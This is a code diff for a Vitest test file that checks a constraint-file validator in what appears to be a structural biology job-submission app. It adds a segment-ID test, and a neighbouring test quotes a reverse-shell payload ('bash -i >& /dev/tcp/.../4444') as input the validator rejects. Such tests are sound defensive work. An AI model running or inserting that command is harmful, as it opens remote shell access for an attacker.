@@ -173,6 +173,15 @@ describe('BilboMDSANSJobSchema - inp_file', () => {
     ).resolves.toBe(file)
   })
 
+  it('checks segment IDs with the PDB rule', async () => {
+    const file = makeFile('const.inp')
+    await BilboMDSANSJobSchema.validateAt('inp_file', { inp_file: file })
+    expect(ValidationFunctions.isValidConstInpFile).toHaveBeenCalledWith(
+      file,
+      'pdb'
+    )
+  })
+
   it('rejects inp_file containing a system directive (reverse shell exploit)', async () => {
     vi.mocked(ValidationFunctions.isValidConstInpFile).mockResolvedValueOnce(
       'Disallowed keyword in constraint file: "system "bash -i >& /dev/tcp/173.230.129.114/4444 0>&1""'
